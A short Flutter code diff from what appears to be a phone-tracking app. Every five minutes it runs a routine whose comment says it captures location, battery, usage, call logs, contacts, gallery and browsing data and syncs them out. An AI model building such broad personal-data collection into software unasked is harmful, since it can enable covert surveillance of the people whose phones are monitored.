@@ -26,14 +26,11 @@ class _TrackingHomePageState extends ConsumerState<TrackingHomePage> {
   void initState() {
     super.initState();
     _checkServiceStatus();
-    // Every 5 min: capture all data, check slow-cycle monitoring, and sync.
-    // Must run in the main isolate because usage/monitoring need MethodChannels.
+    // Every 5 min: capture location, battery, usage, call logs, contacts,
+    // gallery, browsing then sync. Must run in main isolate (MethodChannels).
     _monitorTimer = Timer.periodic(
       const Duration(minutes: 5),
-      (_) async {
-        await BackgroundWorker.captureAllAndSync();
-        await BackgroundWorker.captureMonitoringData();
-      },
+      (_) => BackgroundWorker.captureAllAndSync(),
     );
   }
 
